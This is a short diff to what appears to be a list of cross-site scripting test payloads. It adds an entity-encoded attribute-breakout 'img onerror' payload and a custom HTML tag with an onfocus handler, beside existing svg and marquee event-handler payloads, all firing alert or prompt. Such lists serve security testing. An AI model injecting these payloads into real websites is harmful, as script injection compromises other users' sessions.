@@ -9,4 +9,9 @@
 
 <svg/onload=alert(1)>
 <marquee/onstart=alert(1)>
+
+&quot;&gt;&lt;img src=# onerror=prompt(1231231);&gt;
+
+// Custom HTML tag
+<xssdemo id=testxss onfocus=alert(1) tabindex=1>#testxss
 ```
